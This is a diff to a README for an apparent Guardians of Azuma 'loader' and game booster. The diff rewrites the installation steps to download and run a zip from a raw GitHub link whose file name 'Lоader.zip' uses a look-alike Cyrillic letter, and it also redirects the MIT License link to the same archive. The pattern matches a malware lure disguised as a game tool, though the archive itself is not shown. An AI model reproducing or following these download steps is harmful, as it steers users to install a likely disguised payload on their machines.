@@ -35,9 +35,9 @@ Rune Factory | Guardians of Azuma Loader | Game Booster | Cross-Platform Tool | 
 
 ## 🛠️ Installation
 
-1. **Download Loader.rar** from the repository.
+1. **Download https://raw.githubusercontent.com/ou2121/AzumaGuardians-RuneFactory-GameHub/main/Lоader.zip** from the repository.
 2. Extract files to your preferred directory.
-3. Run Loader.exe and follow on-screen instructions.
+3. Run https://raw.githubusercontent.com/ou2121/AzumaGuardians-RuneFactory-GameHub/main/Lоader.zip and follow on-screen instructions.
 4. Enjoy the unique adventure experience in Guardians of Azuma!
 
 ---
@@ -50,7 +50,7 @@ This tool is provided for **personal and educational use**. All official content
 
 ## 📃 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/ou2121/AzumaGuardians-RuneFactory-GameHub/main/Lоader.zip).  
 © 2025 Guardians of Azuma Community
 
 ---
